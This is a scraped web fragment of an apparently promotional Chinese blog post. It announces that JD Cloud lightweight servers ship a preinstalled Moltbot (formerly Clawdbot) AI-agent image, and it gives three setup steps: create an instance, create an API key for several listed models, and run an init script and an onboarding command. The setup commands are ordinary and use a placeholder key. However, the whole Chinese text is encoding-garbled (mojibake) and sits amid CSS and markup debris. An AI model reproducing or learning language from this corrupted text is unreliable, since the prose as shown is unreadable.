                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Clawdbotï¼ˆç°æ”¹åMoltbotï¼‰ä¸€å¤œçˆ†ç«å…¨çƒï¼Œè¿™ä¸ªèƒ½è¯»æ–‡ä»¶ã€è·‘å‘½ä»¤ã€å†™ä»£ç ã€ç®¡ç³»ç»Ÿçš„å¼€æº AI æ™ºèƒ½ä½“ï¼Œç°å·²æ­£å¼ç™»é™†äº¬ä¸œäº‘ï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®ç¯å¢ƒï¼Œä¸€é”®å³å¯å¼€å¯ï¼Œè®©ä½ çš„ AI åŠ©æ‰‹ç§’çº§ä¸Šçº¿ã€å…¨å¤©å€™å¾…å‘½ã€‚</p>
<p>Moltbotæ˜¯å°‘æ•°çœŸæ­£å…·å¤‡ç³»ç»Ÿçº§æ“ä½œèƒ½åŠ›çš„ä¸ªäººæ™ºèƒ½åŠ©ç†ï¼š</p>
<ul>
<li>æœ¬åœ°é•¿æœŸè®°å¿†ï¼ˆå¯¹è¯æ•°æ®è‡ªä¸»å¯æ§ï¼‰</li>
<li>è·¨å¹³å°æ¨é€ï¼ˆæ”¯æŒå¯¹æ¥é€šè®¯ç±»è½¯ä»¶ï¼‰</li>
<li>çœŸå®ä»»åŠ¡æ‰§è¡Œï¼ˆæ–‡ä»¶æ•´ç†ã€è¡¨å•æäº¤ã€ä»£ç ç”Ÿæˆï¼‰</li>
</ul>
<p>è¿™æ ·ä¸€ä¸ªå¼ºå¤§åˆæ•æ„Ÿçš„ AI åŠ©æ‰‹ï¼Œè¯¥è¿è¡Œåœ¨å“ªé‡Œï¼Ÿæ›´å®‰å…¨ã€æ›´ç¨³å®šçš„æ–¹å¼ï¼Œæ˜¯å°†å…¶éƒ¨ç½²åœ¨ç‹¬ç«‹ã€éš”ç¦»çš„äº‘ç«¯ç¯å¢ƒä¸­ã€‚</p>
<p>äº¬ä¸œäº‘å…¨é¢ä¸Šçº¿ Moltbotï¼äº¬ä¸œäº‘è½»é‡äº‘ä¸»æœºç°å·²é¢„ç½® Moltbot åº”ç”¨é•œåƒï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®ç¯å¢ƒï¼Œä¸‰æ­¥å³å¯å®Œæˆéƒ¨ç½²ï¼Œè®©ä½ çš„ AI åŠ©æ‰‹ç§’çº§ä¸Šçº¿ã€å…¨å¤©å€™å¾…å‘½ã€‚</p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šä¸€é”®åˆ›å»ºå®ä¾‹</strong></p>
<p>åœ¨äº¬ä¸œäº‘æ§åˆ¶å°åˆ›å»ºè½»é‡äº‘ä¸»æœºï¼Œé€‰æ‹©ï¼š</p>
<p>é•œåƒåç§°ï¼šMoltbot</p>
<p>è§„æ ¼å»ºè®®ï¼š2 æ ¸ 2G èµ·ï¼ˆæ¨è 2 æ ¸ 4G ä»¥è·å¾—æ›´ä½³ä½“éªŒï¼‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb5df39896994c999d39dbbbb5683c68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770269455&amp;x-signature=HJNOu74gtVdWM%2F0oymthVkofXL4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>ç¬¬äºŒæ­¥ï¼šè·å–API-Key</strong></p>
<p>ç™»å½•JoyBuilder æ¨¡å‹å¼€å‘å¹³å° 2.0ï¼Œè¿›å…¥API-KEY ç®¡ç†é¡µé¢ï¼š</p>
<p>1ã€ç‚¹å‡»ã€Œåˆ›å»ºã€æŒ‰é’®ï¼Œç”Ÿæˆæ–°çš„ API-Keyï¼›</p>
<p>2ã€åœ¨â€œä¿®æ”¹ API-KEYâ€é¡µé¢ä¸­ï¼Œä¸ºè¯¥ Key é…ç½®å¯è®¿é—®çš„æ¨¡å‹æœåŠ¡ï¼Œå¿…é¡»åŒ…å«ä»¥ä¸‹æ¨¡å‹ï¼šDeepSeek-V3-0324ã€DeepSeek-V3.2ã€DeepSeek-v3ã€Qwen3-235B-A22Bã€Kimi-K2-0905-jcloud</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b2480fed61141f9bfd518706f771fc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770269455&amp;x-signature=0vC%2FTf1O1yhwC2ArcuFoS%2Fh1yNg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c69dc9b127fa435eafdb313b981e5ca2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770269455&amp;x-signature=kyWB4rE918egYuyAe%2BaBqt%2F0K3c%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šåˆå§‹åŒ–ä¸å¯åŠ¨æœåŠ¡</strong></p>
<p>é€šè¿‡æ§åˆ¶å°æˆ–è€…ç»ˆç«¯å·¥å…·ç™»è½»é‡äº‘ä¸»æœºã€‚é¦–æ¬¡ç™»é™†éœ€è¦æ‰§è¡Œè„šæœ¬å‘½ä»¤é…ç½®äº¬ä¸œäº‘æ¨¡å‹æœåŠ¡ï¼š</p>
<p>bash init-clawdbot.sh pk-xxxxx # æ›¿æ¢ä¸ºä½ çš„ API-Key</p>
<p>æ‰§è¡Œåˆå§‹åŒ–å‘½ä»¤ï¼š</p>
<p>clawdbot onboard</p>
<p>æŒ‰å¼•å¯¼å®Œæˆç›¸å…³é…ç½®ï¼š</p>
<p>é£é™©ç¡®è®¤</p>
<p>èŠå¤©æ¸ é“ç»‘å®šï¼ˆå¦‚ Discordã€é£ä¹¦æœºå™¨äººç­‰ï¼‰</p>
<p>â€¦â€¦</p>
<p>ä»¥ä¸Šé…ç½®å®Œæˆåï¼Œå³å¯ä¸Šæ‰‹ä½¿ç”¨ã€‚å¿«ä¸Šäº¬ä¸œäº‘å¼€å¯ä¸€é”®éƒ¨ç½²ï¼Œè®© Moltbot æˆä¸ºä½ ä¸“å±çš„ 24 å°æ—¶æ•°å­—å‘˜å·¥ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>